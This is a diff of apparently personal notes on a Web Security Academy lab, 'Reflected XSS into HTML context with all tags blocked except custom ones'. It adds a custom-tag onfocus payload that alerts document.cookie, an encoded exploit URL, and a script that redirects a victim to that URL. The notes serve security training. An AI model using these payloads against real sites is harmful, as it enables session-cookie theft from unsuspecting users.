@@ -78,7 +78,17 @@ Copy events to clipboard
 # Reflected XSS into HTML context with all tags blocked except custom ones
 
 ```html
-<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+```
+
+```
+https://0a21007b032e40bc807f498000a7008a.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert(document.cookie)+tabindex%3D1%3E#x
+```
+
+```html
+<script>
+location = 'https://0a21007b032e40bc807f498000a7008a.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E#x';
+</script>
 ```
 
 
